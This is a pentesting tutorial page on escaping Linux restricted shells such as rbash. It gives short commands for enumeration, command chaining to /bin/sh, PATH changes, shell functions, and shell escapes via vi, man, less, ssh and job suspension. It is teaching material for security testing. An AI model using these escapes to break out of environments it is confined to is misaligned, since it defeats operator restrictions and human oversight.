---
title: Linux Escaping Restricted Shells
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - privilege
  - escalation
  - linux
---
# Escaping Restricted Shells

Restricted shells (e.g., `rbash`, `rksh`, `rzsh`) limit user capabilities by restricting commands, directory access, and environment modifications. Below are various techniques to escape restricted shells.

But first, when we land on an restricted shell we can enumerate available commands and also what is accessible:

```
# First, we locate the folder with the accepted binaries
echo $PATH

# Second, if ls is restricted, we can use echo `*`. For instance, for printing the files in current directory
echo *

# If the PATH was /home/user/bin, we can list the contents of PATH (the commands we can execute) with echo
echo /home/user/bin/*

# Also, if echo works, but not cat or some redirections characters, we can use that in out favor to read, for instance a file:
echo $(< flag.txt)
```


---

## **1. Command Injection**

If the restricted shell allows executing certain commands with arguments, you can inject additional commands.

```sh
ls -l `pwd`
```

or using `$()`:

```sh
ls -l $(pwd)
```

Another example:

```sh
echo $(whoami)
```

If `pwd` or `whoami` is unrestricted, they will execute.

---

## **2. Command Substitution**

Using backticks (`` `command` ``) or `$()` allows command execution.

```sh
echo `id`
```

or:

```sh
echo $(id)
```

This prints user information even if `id` is restricted.

---

## **3. Command Chaining**

Using `;`, `|`, `&&`, or `||` to append an unrestricted command.

```sh
echo "Restricted Shell"; /bin/sh
```

or:

```sh
ls -l | /bin/sh
```

If `/bin/sh` isn't restricted, this will drop into an unrestricted shell.

---

## **4. Environment Variables**

Modifying `$PATH` or `$SHELL` to execute commands.

```sh
export PATH=/bin:/usr/bin:$PATH
/bin/sh
```

or:

```sh
export SHELL=/bin/sh
exec /bin/sh
```

This changes the default shell to `/bin/sh`, possibly escaping the restricted environment.

---

## **5. Shell Functions**

Defining a function to execute an unrestricted shell.

```sh
function myescape { /bin/sh; }
myescape
```

or overriding a built-in command:

```sh
ls() { /bin/sh; }
ls
```

If `/bin/sh` is available, this escapes the restricted shell.

---

## **6. Using Built-in Commands**

If `vi` or `nano` is allowed, they can spawn an unrestricted shell.

Example using `vi`:

```sh
vi
```

Inside `vi`, press `ESC` and type:

```
:set shell=/bin/sh
:shell
```

If `vi` is available, it spawns a new unrestricted shell.

---

## **7. Using `man` to Execute Commands**

If `man` is allowed:

```sh
man man
!/bin/sh
```

Typing `!/bin/sh` inside `man` spawns a new shell.

---

## **8. Exploiting `less` or `more`**

If `less` or `more` is available:

```sh
less /etc/passwd
```

Then type:

```
!sh
```

This launches an unrestricted shell.

---

## **9. Using SSH to Escape**

If `ssh` is allowed:

```sh
ssh user@localhost /bin/sh
```

This spawns an unrestricted shell if SSH access is permitted.

---

## **10. Backgrounding a Process**

If `Ctrl + Z` works, suspend the shell and launch another shell.

Example:

```sh
vi
```

Then press `Ctrl + Z` to suspend it and try:

```sh
/bin/sh
```

or:

```sh
fg
```

Sometimes this drops you into an unrestricted shell.

---

These techniques vary depending on the level of restriction, but one or a combination of them often works to escape restricted shells.